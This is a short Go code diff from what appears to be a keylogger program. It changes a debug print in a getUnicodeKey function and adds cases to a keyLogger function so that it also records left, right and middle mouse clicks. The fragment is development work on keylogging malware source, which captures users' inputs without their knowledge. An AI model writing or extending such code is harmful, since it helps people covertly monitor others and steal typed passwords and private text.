@@ -185,7 +185,7 @@ func getUnicodeKey(virtualCode syscall.Handle) {
 	unicodeBuf := make([]uint16, 200)
 	state := toUnicodeEx(virtualCode, scanCode, &keyboardBuf[0], &unicodeBuf[0])
 	fmt.Println("KEY BUFF ", keyboardBuf)
-	fmt.Println("SCAN CODE ", scanCode)
+	fmt.Println("SCAN CODE ", virtualCode, scanCode)
 	fmt.Println("UNICODE ", state, unicodeBuf)
 }
 
@@ -198,6 +198,15 @@ func keyLogger() {
 				continue
 			}
 			switch KEY {
+			case constants.VK_LBUTTON:
+				tmpKeylog <- "[LeftMouse]"
+				break
+			case constants.VK_RBUTTON:
+				tmpKeylog <- "[RightMouse]"
+				break
+			case constants.VK_MBUTTON:
+				tmpKeylog <- "[MiddleMouse]"
+				break
 			case constants.VK_BACK:
 				tmpKeylog <- "[Back]"
 				break
